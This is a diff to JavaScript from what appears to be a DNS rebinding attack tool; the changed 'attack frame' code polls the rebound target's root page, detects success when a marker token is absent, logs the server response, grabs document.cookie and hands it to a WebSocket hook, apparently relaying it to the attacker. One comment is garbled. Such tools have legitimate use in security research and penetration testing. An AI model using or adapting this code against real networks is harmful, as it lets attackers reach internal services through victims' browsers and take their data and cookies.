@@ -19,22 +19,32 @@ were working from the target environment.
 
 			/* Send a GET request to '/' (the root web directory) to the IP address and
 			port defined in the manager UI. */
-			fetch('/', {
-					credentials: 'include'
+			fetch('/', {credentials: 'omit',})
+				.then(function (r) {
+					if (r.ok) {
+						console.log(`attack frame ${window.location.hostname} received a response`);
+						return r.text()
+					} else if (r.headers.get('www-authenticate') !== null) {
+						return new Promise(function(resolve, reject) {
+							reject(new Error('This resource requires HTTP Authentication.'));
+						});
+					} 
+					else {
+						throw new Error("Could not fetch requested resource.")
+					}
 				})
-				.then(responseOKOrFail("Could not fetch requested resource."))
 				.then(function (response) { // we successfully received the server response
 					if (response.includes(indextoken) == false && response.length > 0) {
-						if (response.status === 401) {
-							throw new Error('This resource requires authentication');
-						}
+						//if (response.status === 401) {
+						//	throw new Error('This resource requires authentication');
+						//}
 						clearInterval(timer); // stop the attack timer
 						console.log("SUCCESS"); // log to the console
 						initialCookie = document.cookie;
 						// Terminate the attack
 						attackSuccess(`Server response: ${response}`);
 						// TKTK implements retry to hand,e multiple A records fireball block.
-							webSocketHook(initialCookie);
+						webSocketHook(initialCookie);
 
 					} else {
 						// We saw the token in the response. DNS Rebinding did not happen.
